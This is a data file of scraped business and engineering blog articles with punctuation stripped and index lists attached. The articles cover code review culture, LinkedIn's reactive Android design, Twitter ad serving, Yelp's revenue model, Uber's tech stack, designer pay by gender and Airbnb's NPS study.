reviews raise team standards  Aside from promoting psychic flexibility  code reviews also help prevent the broken window effect by making sure all of our engineers share a similarly high set of standards  The mere act of saying explicitly to ourselves that we have very high standards perpetuates a virtuous cycle  People begin to want to honor our high bar of quality for its own sake  not merely to  get past the reviewer   Upholding the culture of code reviews becomes a mantle each of us proudly and voluntarily advances  Putting a well crafted piece of code in front of your reviewer in the first place becomes more important than earning an eventual LGTM  Showing yourself to be  the most receptive  to even the most deflating critique is a badge of honor  Perfecting your tone as a reviewer so that you can deliver even harsh feedback in a respectful and palatable manner is a celebrated skill  Code reviews propel teamwork  The act of reconciling different viewpoints between reviewer and reviewee can sometimes be a challenge  Opinions are often subjective  e g   I just don t like how you ve done this   to which one might respond   Yeah  well  I do like how I ve done this    and the reviewer might be making a good judgment call  or might just be obstructionist without quite realizing it   Humans are complicated  amirite   So  how do people resolve those kinds of divergent perspectives  Becoming good at this activity is the essence of functioning effectively as an egalitarian team  You shouldn t need or want a manager acting as an  adult  to come in and break a stalemate  you should want everyone in your company to have the conflict resolution skills to work through such situations rationally  Code reviews are neverending practice of your dispute resolution skills  which usefully spill over into many other areas of work life  Code reviews keep security top of mind  How might code reviews affect the security of your application  Even if we assume that automated tools  e g  vulnerability scanning  find individual security problems more reliably than code reviews  there s much more to the story  Let s talk at the  meta  level  What message does it send to every engineer that  upon every single change  their code will be reviewed for security problems  First  it keeps security top of mind as code is being designed and written  The high team standards mentioned earlier make every engineer want to not only pass a code review  but genuinely impress the reviewer with their code s quality  making it far less likely that security considerations would be forgotten or overlooked  It s very embarrassing to fail to sanitize data and invite cross site scripting vulnerabilities  for example  Second  maintaining great security means keeping track of myriad evolving technicalities  and code reviews can be an effective way for engineers to train each other continuously and organically  If Jaime learns about a new exploit on Hacker News this morning  he can look for it in the code reviews he does this afternoon  Contrast this with sending engineers to a security training seminar  It has some value  sure  But it sounds better on paper than it is in reality  because when you learn things out of context in a classroom  you don t learn them nearly as well as in a contextual  hands on scenario that you care about  your own code  for example  and one time training  to the extent that your team manages to retain anything they learn  becomes stale very  very quickly in the technology world  Code reviews  instead  require both reviewers and reviewees to constantly update their security knowledge and to practice it in the most relevant context possible  inside the implementation of the product itself  Security is thus never treated as  a thing apart   and security implications are a fundamental aspect of every change we make  Code reviews frame social recognition,"[656 1225 683 206 713 1234 1217 1252 800 1235 778]"
661,training-dataset/engineering/742.txt,engineering,The Functional Reactive Architecture Pattern and Its Application to Android AppsThrottling is the result of the debounce function  For instance  if the member types in  m  and within 200ms types in  o   and within another 200ms types in  u   the only text that will flow to the distinctUntilChanged function is  mou   In other words  just  m  and  mo  will not be emitted   Dedup is the result of the distinctUntilChanged function  For instance  when the text  mou  has flown to the Rest li client and a REST call is ongoing  after 200ms if the member types in  n  then immediately deletes  n   the new text  mou  will pass the throttling and flow to the distinctUntilChanged function  and the new  mou  text will be discarded by it  A location typeahead suggestion REST call will not be initiated for the second  mou    Freshness is the result of the switchMap function  For instance  suppose the Rest li client is querying location typeahead suggestions for text  mou  and the REST call takes longer than usual due to temporary network congestion  After 200ms  when more text  e g    mountain view   flows into the switchMap function  the switchMap will first unsubscribe the render from the results of the ongoing REST call for  mou   then re subscribe the render to the new REST call for  mountain view   From a user experience point of view  the member will only see the location typeahead suggestions for  mountain view   Although there are in fact two REST calls running in parallel  and both intend to render the location typeahead suggestions they get  the location typeahead suggestions for the text  mou  will never be shown  regardless of which REST call finishes first   Creating a virtual repository  Among the many features that LinkedIn offers to its members is one that allows members to save follow many entities  such as jobs  companies  people  roles  articles  locations  school events  etc  For each entity  there is a generic frontend API readily available  For example  there is a saved jobs rest service  saved companies rest service  and so on  These generic frontend APIs are necessary for tracking each saved entity  For example  the LinkedIn Job Search app helps a LinkedIn member to track saved jobs and applied jobs  Based on what we have discussed in previous sections  it should be easy to imagine that two repositories  savedJobPostingRepository and appliedJobPostingRepository  have been implemented leveraging Rest li clients supplied by the RestClientProvider  newSavedJobPostingClient   and newAppliedJobPostingClient    respectively   However  as the figure below illustrates  in the LinkedIn Students app  there is a  My Stuff  page that offers the member a summarized view of all the entities that the member has saved with LinkedIn,"[661 293 884 314 890 134 875 1046 1351 1027 234]"
664,training-dataset/engineering/1157.txt,engineering,Trackers leaking bank account dataIf you ever connected to the Internet before the 2000s  you probably remember that it made a peculiar sound  But despite becoming so familia,"[664 1402 18 92 1373 794 1106 576 712 778 357]"
666,training-dataset/business/1063.txt,business,Patrick Lencioni   The Four Traits of Healthy TeamsUploaded on Nov 24  2011  IESE Prof  Marta Elvira recently spoke with Patrick Lencioni  an expert on building teams and healthy organizations  at the World Business Forum in New York     In their discussion  Lencioni points out that healthy teams have the following four characteristics in common  1  cohesive leadership 2  intellectual vibrance 3  the ability to communicate clearly and 4  structure  without being overly bureacratic     Subscribe to IESE News  www iese edu news,"[666 935 1351 278 773 134 582 778 1347 596 673]"
669,training-dataset/engineering/36.txt,engineering,Resilient ad serving at Twitter scaleIntroduction  Popular events  breaking news  and other happenings around the world drive hundreds of millions of visitors to Twitter  and they generate a huge amount of traffic  often in an unpredictable manner  Advertisers seize these opportunities and react quickly to reach their target audience in real time  resulting in demand surges in the marketplace  In the midst of such variability  Twitter s ad server   our revenue engine   performs ad matching  scoring  and serving at an immense scale  The goal for our ads serving system is to serve queries at Twitter scale without buckling under load spikes  find the best possible ad for every query  and utilize our resources optimally at all times   Let s discuss one of the techniques we use to achieve our goal   Operate a highly available service  four nines  at Twitter scale query loads  be resilient  and degrade gracefully with increase in QPS or demand   Serve the highest quality ad possible  for every query  given current resource constraints  Use resources optimally  We would like to provision such that we are at a high level of average CPU utilization while sustaining business continuity in the event of a datacenter failure  Disaster Recovery  or  DR   compliance    A brief overview of the ad serving pipeline  A brief introduction to the ad serving pipeline  henceforth called serving pipeline  is in order before discussing the technique in detail  The serving pipeline can be visualized as a funnel with the following stages   Selection  The selection phase sifts through the entire corpus of potential ad candidates for a query and comes up with a set of matches whose targeting criteria match the user in question  Selection may result in as little as a few tens to as many as several thousands of candidates being selected  All these candidates are eligible participants in subsequent stages  The number of ad candidates selected for a particular query is essentially the result of a match between user attributes and targeting criteria across the corpus of ads in the index  Hence  not all ads are relevant for all users     Engagement rate prediction  The engagement rate for an ad is defined as the ratio of the number of engagements  e g   click  follow  Retweet  on an ad impression to the total number of impressions served  Engagement rate is a critical predictor that determines the relevancy of an ad for a particular user  this score can be used to answer the question   How likely is user U to engage with ad A     This rate changes in real time  and is evaluated by machine learned models based on a number of user and advertiser features   Evaluating the engagement rate is one of the most computationally expensive phases of the serving pipeline  and therefore  we run multiple rounds of this predictor to progressively thin down the number of candidates that are ultimately run through the auction  We first run a light version of the predictor over the entire set of selected auction candidates  We use this to limit the number of candidates to some top k  order of hundreds  that we then run through the full auction  Since the best ad can be found by running all the selected candidates through the auction  it stands to reason that by decreasing the value of k  we make the auction cheaper in terms of both CPU utilization and latency  but at the same time find a slightly lower quality ad  Therefore  k serves as a knob that can be used to tradeoff latency against ad quality   Auction  Typically  a standard second price auction is run for every request on the expected cost per impression  computed as bid times the engagement rate   Additional rules and logic apply if the bidding happens on our ad exchange  Mopub marketplace   Ad server latencies and success rate  Queries hitting the ad server are not all the same in terms of how valuable they are  some queries are more monetizable than others  thereby making the cost of a failed query variable  Requests also have high variance in compute  depending upon the ad match  We observe two strong correlations   Revenue per request correlates with the number of candidates in the auction Query latency correlates with the number of candidates in the auction  High latency requests   the ones that influence success rate   therefore contribute disproportionately to revenue  Simply put  the more work we expend for a query  the more revenue we stand to make  Hence it follows that timing out the higher latency requests has a disproportionately negative impact on revenue  We can conclude from the above observation that it is very important to maintain a high success rate   Using k to scale the ad server  As you will recall  k is a knob that can be used to control CPU utilization and latency  This provides us with an interesting insight   we could simply use k as a means to scale the ad server  as long as we have a good way to pick the right value for k for every query   One strategy to pick k is to predictively determine its value based on a set of observable features for every query  e g   current load  available CPU  current success rate  user features  etc    While this approach is promising  it is expensive and hard to model precisely  Our model s  for predicting k would have to be complex to react quickly to external parameters  e g   load spikes   and such prediction itself can prove to be computationally expensive   Another strategy is to continually learn the value for k  To do this  we should pick a metric to center the system around that s both fundamentally important to the system as well as influenced directly by this knob  k  Since we know that k directly influences latency  an adaptive learning strategy that learns k by tracking success rate is a viable approach   We build this adaptive learner into our ad server  which essentially functions as a control system that learns k  For quick reference  a basic controller  see figure below  keeps a system at a desired set point  expectation  by continuously calculating the deviation of the process output against the set point through a feedback loop  and minimizes this error by the use of a control variable  Mapping this to the ad server s goal of operating at the right k value  we fix our set point to the target success rate we desire  say  99 9    and build a controller that constantly tracks towards this success rate by adjusting k   QF  adaptive quality factor  The controller we build outputs a control variable called quality factor  q   which performs the function of keeping the success rate  SR  at the expectation  q varies by following a few simple rules  q reduces by some   for every failure  and increases by f    for every successful query  For example  if the target SR is to be kept at  99 9   every failure will reduce q by    and every successful query will increase q by   999  Hence  if the system stays at the target success rate of 99 9   the variation of q within the span of 1 000 requests would be negligible    and f will determine the rate at which q will adapt  and can be set with proper tuning   Any target success rate can be translated into a target latency requirement since latency and success rate are inversely related  If our target SR translates to a target latency requirement of T  we can say that in effect  q stays constant as long as we are at the target latency  It increases when the latencies are lower than T  and decreases when the latencies exceed T  When the ad server starts  it picks some default value for q which then adjusts to a level commensurate with the current load and latency profile by following the aforementioned rules   How do we use q   With q defined as above  we select the top q k candidates after our light prediction stage instead of k  q converges when query latencies are around T  During times of high QPS or failover  q automatically adapts down  thereby reducing the number of candidates entering the full auction and reducing the load on a computationally expensive step  while suffering a loss in ad quality   This consequently reduces query latency  and keeps our success rate to upstream clients on target  Importantly  during regular operation  we can operate at a q value of greater than 1 0 with current provisioning  since we provision for DR  and have extra capacity available most of the time    The figure below shows how q adapts to variation in load  both are normalized by some factor to show the interplay more clearly   During times of low qps  q trends up  thereby effectively increasing the amount of work done per query  and when qps peaks  q trends down  reducing the work done per query  This has the effect of using our CPU optimally at all times   Another interesting aspect of this design is that each ad server instance maintains its own view of an optimal q  thereby ensuring that we have resiliency at a local  per instance level  requiring no central coordination   In practice  the ad server uses several tunable parameters to control the performance characteristics of various parts of the system  The k we saw before  candidates after light prediction  is only one such knob  We can now use q as a parameter to tune each of these other parameters further  thereby achieving efficiencies across the whole of the ad server   You might recollect that at the beginning of this blog  we stated that our goal was around effectively utilizing CPU  but our technique of using the quality factor tried to achieve this goal by ultimately controlling latency  In order for this to improve CPU utilization  we would have to first ensure that the ad server is CPU bound  and not latency bound  We achieve this by making all operations asynchronous  reducing lock contention  etc   How does q help with provisioning   The typical approach to provisioning is to allocate resources at a level such that comfortably allows for temporary spikes in load and maintain business continuity during failovers  disaster recovery    It is easy to see why this is wasteful  since we end up underutilizing resources during the normal course of operation  Ideally  we would like for our utilization to always be close to our provisioning  while still being able to absorb load spikes  as shown in the green line in the curve below    Quality factor helps us understand and maintain optimal provisioning levels  With experimentation  we are able to measure the impact of varying q on key performance indicators such as RPMq   and also on the impact on downstream services  during query execution  the ad server calls out to several downstream components such as user data services and other key value stores  The impact on these downstream components should  therefore  be taken into account for any provisioning changes in the ad server   Thus  we re able to increase or decrease our provisioning levels based on desired operating points in our system  By directly controlling utilization  q allows us to use our provisioning optimally at all levels   This benefit  however  does not come without cost  As alluded to before  we trade off ad quality for this ability to always optimally utilize our resources  Since q basically tracks ad quality  we see a temporary dip in ad quality during periods of high load  We see in practice that this is a very fair tradeoff to make   Since q semantically represents the revenue made per unit core time  it also serves as a ready metric for us to get a sense of current performance from a revenue  or more precisely  an RPMq  standpoint  This graph shows the strong correlation   Wrapping up  The technique we ve outlined uses concepts from control theory to craft a control variable called quality factor  which is then used by the ad server in achieving the stated goals around resiliency  availability   scalability  resource utilization  and revenue optimality  Quality factor has benefited our ad serving system enormously  and is a critical metric that is now used to tune several parameters across the ad server besides the auction depth  It also allows us to evaluate the cost of incremental capacity increases against the revenue gains they drive   The ads serving team at Twitter takes on challenges posed by such enormous scale on a continual basis  If building such world class systems excites you  we invite you to join the flock   Acknowledgements  Ads Serving Team  Sridhar Iyer  Rohith Menon  Ken Kawamoto  Gopal Rajpurohit  Venu Kasturi  Pankaj Gupta  Roman Chen  Jun Erh  James Gao  Sandy Strong  Brian Weber  Parag Agrawal was instrumental in conceiving and designing the adaptive quality factor    RPMq   Revenue per thousand queries,"[669 1409 1336 1422 1403 1117 1351 946 293 733 92]"
671,training-dataset/business/873.txt,business,How does Yelp make money Like a good old long term relationship  you only appreciate Yelp once it s gone  As someone who lives in a Yelpless land  take my word for it  Appreciate   Today we ll be looking at Yelp from the angle of Yelp s pocket  or in other words  we ll examine how Yelp generates revenue   To help get us started  allow me to first throw some numbers at you   2004 Yelp was founded  2012 Yelp IPOed  5 companies acquired by Yelp  Qype  SeatMe  Restaurant Kritik  Cityvox  Eat24   32 countries get to yelp  20M mobile devices with the Yelp app  Q4  2015   140M unique website visitors  Q4  2015    100M reviews written  2 200 Salespeople employed   551M in revenue  2015   Two main take aways  food lingo intended    1  Adding a community on top of  Yellow Pages    a pretty good idea   2  Reading the rest to see how Yelp makes money   also a pretty good idea   So how does Yelp make money   1  Local Advertising  Over 80  of Yelp s revenues comes from local advertisers  AKA local business owners  who operate in up to 9 physical locations  In 2015  Yelp had over 110 000 local businesses advertising on its platform  but it s only the tip of the iceberg  Yelp is going after what it considers to be a very lucrative market  with over 20 million local businesses in the US alone  who spend   150B on advertising   These businesses have 2 main options     Self service advertising    Full service advertising  AKA more expensive advertising   Self service advertising  With Yelp s self service advertising you can   a  Run a search ad campaign     Monthly budgets ranging from  50 to  1 000 on average for local advertisers    CPC ranges from  1 to  20  b  Enhance your Yelp profile page     Disable competing ads on the profile page    Add more room for a photo slideshow    Add a prominent  call to action  button    All for a monthly cost of  50  100  Full service advertising  The main difference between the self  and the full service is  as the name would suggest  you get full service  If online advertising just isn t your thing  they ll do it for you  Instead of letting marketing agencies offer these services and join the feast  like Facebook does   Yelp tries to do it all   On top of service  full service clients also get to add a featured video to their profile and have the ability to track calls coming in from Yelp users   Bottom line  it s mainly about the service   2  Affiliation on Deliveries  Eat24  Acquired by Yelp in 2015  Eat24 is a food delivery   takeout app   It operates in 1 500 cities across the US  in 30 000 restaurants  generating  45M in 2015 alone   The business model is simple  Restaurant owners sign up for free  get listed on Eat24 and can promote their restaurant by paying a fee per actual order  10  12 5  of the order value    Given the money comes from the restaurant owners  Eat24 can offer improved service  with no service fees  to corporate accounts  who order food for all their employees   Yelp s Affiliate Program  For the past few years  Yelp has been operating an affiliate program  giving affiliates the option to promote its deals to users  for a 10  cut of the deal   Affiliates can sign up on various affiliate networks  for example  and use Yelp s API to bring in the supply   3  Reservation Management  SeatMe   Acquired by Yelp in 2013  SeatMe is a tool that lets restaurants and bars manage their table reservations   SeatMe has  2 700 clients  who pay  99 p m  which means just over  3 2M in revenue  2015    4  Brand Advertising  Brand advertising accounted for  7  of Yelp s revenues in 2015  With over 140 million unique visitors to yelp com in Q4 2015 alone  Yelp has plenty of page views to go round  allowing big advertisers to run big display ad campaigns  With that said  it seems Yelp is killing its display ads business  to focus more on its core  local advertising   In summary  Yelp is a local advertising monster  that can deliver  food   It s growing pretty fast  so if you can t beat it  order in,"[671 1351 773 843 171 1403 61 669 778 1373 357]"
673,training-dataset/engineering/524.txt,engineering,The Uber Engineering Tech Stack  Part I  The Foundationby Lucie Lozinski  Update  This article discusses the lower half of the stack  For the rest  see Part II  The Edge and Beyond   Uber Engineering  Uber s mission is transportation as reliable as running water  everywhere  for everyone  To make that possible  we create and work with complex data  Then we bundle it up neatly as a platform that enables drivers to get business and riders to get around   While we want Uber s UI to be simple  we engineer complex systems behind it to stay up  handle difficult interactions  and serve massive amounts of traffic  We ve broken up the original monolithic architecture into many parts to scale with growth  With hundreds of microservices that depend on each other  drawing a diagram of how Uber works at this point is wildly complicated  and it all changes rapidly  What we can cover in a two part article is the stack we used as of spring 2016   Uber Engineering s Challenges  No Free Users  Hypergrowth  We have the same global scale problems as some of the most successful software companies  but 1  we re only six years old  so we haven t solved them yet  and 2  our business is based in the physical world in real time   Unlike freemium services  Uber has only transactional users  riders  drivers  and now eaters and couriers  People rely on our technology to make money  to go where they need to go so there s no safe time to pause  We prioritize availability and scalability   As we expand on the roads  our service must scale  Our stack s flexibility encourages competition so the best ideas can win  These ideas aren t necessarily unique  If a strong tool exists  we use it until our needs exceed its abilities  When we need something more  we build in house solutions  Uber Engineering has responded to growth with tremendous adaptability  creativity  and discipline in the past year  Throughout 2016  we have even bigger plans  By the time you read this  much will have changed  but this is a snapshot of what we re using now  Through our descriptions  we hope to demonstrate our philosophy around using tools and technologies   Uber s Tech Stack  Instead of a tower of restrictions  picture a tree  Looking at the technologies across Uber  you see a common stack  like a tree trunk  with different emphases for each team or engineering office  its branches   It s all made of the same stuff  but tools and services bloom differently in various areas   We ll start from the bottom  worked for Drake    Bottom  Platform  This first article focuses on the Uber platform  meaning everything that powers the broader Uber Engineering organization  Platform teams create and maintain things that enable other engineers to build programs  features  and the apps you use   Infrastructure and Storage  Our business runs on a hybrid cloud model  using a mix of cloud providers and multiple active data centers  If one data center fails  trips  and all the services associated with trips  fail over to another one  We assign cities to the geographically closest data center  but every city is backed up on a different data center in another location  This means that all of our data centers are running trips at all times  we have no notion of a  backup  data center  To provision this infrastructure  we use a mix of internal tools and Terraform   Our needs for storage have changed with growth  A single Postgres instance got us through our infancy  but as we grew so quickly  we needed to increase available disk storage and decrease system response times   We currently use Schemaless  built in house on top of MySQL   Riak  and Cassandra  Schemaless is for long term data storage  Riak and Cassandra meet high availability  low latency demands  Over time  Schemaless instances replace individual MySQL and Postgres instances  and Cassandra replaces Riak for speed and performance  For distributed storage and analytics for complex data  we use a Hadoop warehouse  Beyond these databases  our Seattle engineers focus on building a new real time data platform   We use Redis for both caching and queuing  Twemproxy provides scalability of the caching layer without sacrificing cache hit rate via its consistent hashing algorithm  Celery workers process async workflow operations using those Redis instances   Logging  Our services interact with each other and mobile devices  and those interactions are valuable for internal uses like debugging as well as business cases like dynamic pricing  For logging  we use multiple Kafka clusters  and the data is archived into Hadoop and or a file storage web service before it expires from Kafka  This data is also ingested in real time by various services and indexed into an ELK stack for searching and visualizations  ELK stands for Elasticsearch  Logstash  and Kibana    App Provisioning  We use Docker containers on Mesos to run our microservices with consistent configurations scalably  with help from Aurora for long running services and cron jobs  One of our infrastructure teams  Application Platform  produced a template library that builds services into shippable Docker images   Routing and Service Discovery  Our service oriented architecture  SOA  makes service discovery and routing crucial to Uber s success  Services must be able to communicate with each other in our complex network  We ve used a combination of HAProxy and Hyperbahn to solve this problem  Hyperbahn is part of a collection of open source software developed at Uber  Ringpop  TChannel  and Hyperbahn all share a common mission to add automation  intelligence  and performance to a network of services   Legacy services use local HAProxy instances to route JSON over HTTP requests to other services  with front end web server NGINX proxying to servers in the back end  This well established way of transferring data makes troubleshooting easy  which was crucial throughout several migrations to newly developed systems in the last year   However  we re prioritizing long term reliability over debuggability  Alternative protocols to HTTP  like SPDY  HTTP 2  and TChannel  along with interface definition languages like Thrift and Protobuf will help evolve our system in terms of speed and reliability  Ringpop  a consistent hashing layer  brings cooperation and self healing to the application level  Hyperbahn enables services to find and communicate with others simply and reliably  even as services are scheduled dynamically with Mesos   Instead of archaically polling to see if something has changed  we re moving to a pub sub pattern  publishing updates to subscribers   HTTP 2 and SPDY more easily enable this push model  Several poll based features within the Uber app will see a tremendous speedup by moving to push   Development and Deploy  Phabricator powers a lot of internal operations  from code review to documentation to process automation  We search through our code on OpenGrok  For Uber s open source projects  we develop in the open using GitHub for issue tracking and code reviews   Uber Engineering strives to make development simulate production as closely as possible  so we develop mostly on virtual machines running on a cloud provider or a developer s laptop  We built our own internal deployment system to manage builds  Jenkins does continuous integration  We combined Packer  Vagrant  Boto  and Unison to create tools for building  managing  and developing on virtual machines  We use Clusto for inventory management in development  Puppet manages system configuration   We constantly work to build and maintain stable communication channels  not just for our services but also for our engineers  For information discovery  we built uBlame  a nod to git blame  to keep track of which team owns a particular service  and Whober for looking up names  faces  contact information  and organizational structure  We use an in house documentation site that autobuilds docs from repositories using Sphinx  An enterprise alerting service alerts our on call engineers to keep systems running  Most developers run OSX on their laptops  and most of our production instances run Linux with Debian Jessie   Languages  At the lower levels  Uber s engineers primarily write in Python  Node js  Go  and Java  We started with two main languages  Node js for the Marketplace team  and Python for everyone else  These first languages still power most services running at Uber today   We adopted Go and Java for high performance reasons  We provide first class support for these languages  Java takes advantage of the open source ecosystem and integrates with external technologies  like Hadoop and other analytics tools  Go gives us efficiency  simplicity  and runtime speed   We rip out and replace older Python code as we break up the original code base into microservices  An asynchronous programming model gives us better throughput  We use Tornado with Python  but Go s native support for concurrency is ideal for most new performance critical services   We write tools in C and C   when it s necessary  like for high efficiency  high speed code at the system level   We use software that s written in those languages HAProxy  for example but for the most part  we don t actually work in them   And  of course  those working at the top of the stack write in languages beyond Java  Go  Python  and Node   Testing  To make sure that our services can handle the demands of our production environment  we ve developed two internal tools  Hailstorm and uDestroy  Hailstorm drives integration tests and simulates peak load during off peak times  while uDestroy intentionally breaks things so we can get better at handling unexpected failures   Our employees use a beta version of the app to continuously test new developments before they reach users  We made an app feedback reporter to catch any bugs before we roll out to users  Whenever we take a screenshot in the Uber apps  this feature prompts us to file a bug fix task in Phabricator   Reliability  Engineers that write backend services are responsible for their operations  If they write some code that breaks in production  they get paged  We use Nagios alerting for monitoring  tied to an alerting system for notifications   Aiming for the best availability and 1 billion rides per day  site reliability engineers focus on getting services what they need to succeed   Observability  Observability means making sure Uber as a whole  and its different parts  are healthy  Mostly developed by our New York City office  a collection of systems acts as the eyes  ears  and immune system of Uber Engineering around the world   Telemetry  We developed M3 in Go to collect and store metrics from every part of Uber Engineering  every server  host service  and piece of code    After we collect the data  we look for trends  We built dashboards and graphs by modifying Grafana to more expressively contextualize information  Every engineer watching a dashboard tends to care about data in a particular location or region  around a set of experiments  or related to a certain product  We added data slicing and dicing to Grafana   Anomaly Detection  Argos  our in house anomaly detection tool  examines incoming metrics and compares them to predictive models based on historical data to determine whether current data is within the expected bounds   Acting on Metrics  Uber s  Monitor tool enables engineers to view this information and thresholding  either static or Argos s smart thresholding  and take action on it  If a stream of data goes out of bounds say trips drop below a certain threshold in some city this information gets passed to the Common Action Gateway  That s our automatic response system  Instead of paging engineers when there s a problem  it does something about it and reduces the problem s duration  If a deploy presents some problem  rollback is automatic   Most of our observability tools are kept within Uber because they re specific to our infrastructure  but we hope to extract and open source the general purpose parts soon   Using Data Creatively  Storm and Spark crunch data streams into useful business metrics  Our data visualization team creates reusable frameworks and applications to consume visual data   Mapping and experimentation teams rely on data visualization to convert data into clear  sensible information  City operations teams can see the drivers in their city flowing in real time as cars on a map instead of deriving insights from tedious SQL queries   We use JavaScript  ES5 and ES6  and React to build data products as our core tools  We also use all web standards for graphics in our visualization components  SVG  Canvas 2D  and WebGL  Many of the libraries we develop are open source  like react map gl  which we depend on for mapping visualizations   We also develop frameworks for visualization that other technologies  like R and Shiny and Python  can access for our charting components  We want high data density visualizations that perform smoothly in the browser  To obtain both goals  we developed open source WebGL based visualization tools   Mapping  Uber s maps teams prioritize the datasets  algorithms  and tooling around map data  display  routing  and systems for collecting and recommending addresses and locations  Map Services runs on a primarily Java based stack   The highest volume service in this area is Gurafu  which provides a set of utilities for working with road map data and improves efficiency and accuracy by providing more sophisticated routing options  Gurafu is fronted by  ETA  which adds a business logic layer on top of raw ETAs  things like experiment group segmentation   Both Gurafu and  ETA are web services built on the DropWizard framework   Our business and customers rely on highly accurate ETAs  so Map Services engineers spend a lot of time making these systems more correct  We perform ETA error analysis to identify and fix sources of error  And beyond accuracy  the scale of the problem is interesting  every second  systems across the organization make huge numbers of decisions using ETA information  As the latency of those requests must be on the order of 5 milliseconds  algorithmic efficiency becomes a big concern  We have to be concerned with the way we allocate memory  parallelize computations  and make requests to slow resources like the system disk or the data center network   Map Services also powers all of the backend technology behind the search boxes in the rider and driver app  The technologies include the autocomplete search engine  the predictions engine  and the reverse geocoding service  The autocomplete search engine allows high speed  locally biased location search for places and addresses  Our predictions engine uses machine learning to predict the rider s destination based on a combination of user history and other signals  Predictions account for  50  of destinations entered  The reverse geocoder determines the user s location based on GPS  which we augment with additional information for suggested Uber pickup spots based on our overall trip history   Above this  we enter the parts of the stack that interact with your phone  Stay tuned for the next post  While Uber s technologies and challenges will likely change  our mission and culture of overcoming them will last  Want to be a part of it   Photo Credit   Chapman s Baobab  by Conor Myhrvold  Botswana   Header Explanation  Baobab trees are renowned for their resilience  longevity and thick trunk and branches  Chapman s Baobab in the Kalahari desert is one of Africa s oldest trees,"[673 1300 952 281 1016 778 1086 1351 1010 500 92]"
674,training-dataset/product/1195.txt,product,Exploring gender and compensationNow more than ever  it seems  industries are acutely aware of wage gaps related to gender  The design industry is no exception  An earlier post on our blog about designer compensation garnered quite a bit of specific discussion about the differences in pay for male versus female designers  so let s dive a bit deeper   To set the stage  we must note that this report included responses from 1 211 men and 446 women  a roughly 3 1 ratio   According to the report  gender can be a factor of significance when it comes to where one chooses to work  Our total survey breakdown was 3 1 male to female  but at agencies  the breakdown is closer to 4 1  Men are also far more likely to report working as freelancers and on a contractual basis  The ratio narrows every so slightly at startups   The gender breakdown narrows more for in house small business designers  where the ratio comes out to about 2 1 male to female  It s closest at government and education organizations  clocking in at 1 5 men for every woman   The specific design roles men and women specialize in also reveal quite a bit of variance  Men are far more likely to report working as developers  coders  industrial designers  and product designers  The areas where men and women are more evenly represented include information architecture  marketing design  and usability testing   While salaries for men versus women differed on average only slightly  with women averaging  76 014 and men averaging  77 112  a closer look at where designers work revealed far larger gaps   Men and women in agencies  startups  and government organizations were closest in salary  At education organizations  though  women averaged almost  10 000 less than men  and on in house small business teams  women averaged about  8 000 less annually  Female freelancers contractual designers reported making about  9 000 less than their male counterparts   Startups were the only work environment where women reported making more  about  2 000  than men   Of note is that women were also more likely than men to have a higher degree  Nearly 72  of women held at least a bachelor s  compared to 56  of men   Want to see more  Dive into the 2016 Product Design Report,"[674 262 332 1373 656 1016 61 695 300 1422 778]"
681,training-dataset/engineering/863.txt,engineering,How well does NPS predict rebooking Data scientists at Airbnb collect and use data to optimize products  identify problem areas  and inform business decisions  For most guests  however  the defining moments of the  Airbnb experience  happen in the real world   when they are traveling to their listing  being greeted by their host  settling into the listing  and exploring the destination  These are the moments that make or break the Airbnb experience  no matter how great we make our website  The purpose of this post is to show how we can use data to understand the quality of the trip experience  and in particular how the  Net promoter score  adds value   Currently  the best information we can gather about the offline experience is from the review that guests complete on Airbnb com after their trip ends  The review  which is optional  asks for textual feedback and rating scores from 1 5 for the overall experience as well as subcategories  Accuracy  Cleanliness  Checkin  Communication  Location  and Value  Starting at the end of 2013  we added one more question to our review form  the NPS question   NPS  or the  Net Promoter Score   is a widely used customer loyalty metric introduced by Fred Reicheld in 2003  https   hbr org 2003 12 the one number you need to grow ar 1    We ask guests  How likely are you to recommend Airbnb to a friend     a question called  likelihood to recommend  or LTR  Guests who respond with a 9 or 10 are labeled as  promoters   or loyal enthusiasts  while guests who respond with a score of 0 to 6 are  detractors   or unhappy customers  Those who leave a 7 or 8 are considered to be  passives   Our company s NPS  Net Promoter Score  is then calculated by subtracting the percent of  detractors  from the percent of  promoters   and is a number that ranges from  100  worst case scenario  all responses are detractors  to  100  best case scenario  all responses are promoters    By measuring customer loyalty as opposed to satisfaction with a single stay  NPS surveys aim to be a more effective methodology to determine the likelihood that the customer will return to book again  spread the word to their friends  and resist market pressure to defect to a competitor  In this blog post  we look to our data to find out if this is actually the case  We find that higher NPS does in general correspond to more referrals and rebookings  But we find that controlling for other factors  it does not significantly improve our ability to predict if a guest will book on Airbnb again in the next year  Therefore  the business impact of increasing NPS scores may be less than what we would estimate from a naive analysis   Methodology  We will refer to a single person s response to the NPS question as their LTR  likelihood to recommend  score  While NPS ranges from  100 to  100  LTR is an integer that ranges from 0 to 10  In this study  we look at all guests with trips that ended between January 15  2014 and April 1  2014  If a guest took more than one trip within that time frame  only the first trip is considered  We then try to predict if the guest will make another booking with Airbnb  up to one year after the end of the first trip   One thing to note is that leaving a review after a trip is optional  as are the various components of the review itself  A small fraction of guests do not leave a review or leave a review but choose not to respond to the NPS question  While NPS is typically calculated only from responders  in this analysis we include non responders by factoring in both guests who do not a leave a review as well as those who leave a review but choose not to answer the NPS question   To assess the predictive power of LTR  we control for other parameters that are correlated with rebooking  These include   Overall review score and responses to review subcategories  All review categories are on a scale of 1 5   Guest acquisition channel  e g  organic or through marketing campaigns   Trip destination  e g  America  Europe  Asia  etc   Origin of guest  Previous bookings by the guest on Airbnb  Trip Length  Number of guests  Price per night  Month of checkout  to account for seasonality   Room type  entire home  private room  shared room   Number of other listings the host owns  We acknowledge that our approach may have the following shortcomings   There may be other forms of loyalty not captured by rebooking  While we do look at referrals submitted through our company s referral program  customer loyalty can also be manifested through word of mouth of referrals that are not captured in this study   There may be a longer time horizon for some guests to rebook  We look one year out  but some guests may travel less frequently and would rebook in two to three years   One guest s LTR may not be a direct substitute for the aggregate NPS  It is possible that even if we cannot accurately predict one customer s likelihood to rebook based on their LTR  we would fare better if we used NPS to predict an entire cohort s likelihood to rebook   Despite these shortcomings  we hope that this study will provide a data informed way to think about the value NPS brings to our understanding of the offline experience   Descriptive Stats of the Data  Our data covers more than 600 000 guests  Our data shows that out of guests who submitted a review  two thirds of guests were NPS promoters  More than half gave an LTR of 10  Of the 600 000 guests in our data set  only 2  were detractors   While the overall review score for a trip is aimed at assessing the quality of the trip  the NPS question serves to gauge customer loyalty  We look at how correlated these two variables are by looking at the distributions of LTR scores broken down by overall review score  Although the LTR and overall review rating are correlated  they do provide some differences in information  For example  of the small number of guests who had a disappointing experience and left a 1 star review  26  were actually promoters of Airbnb  indicating that they were still very positive about the company   Keeping in mind that 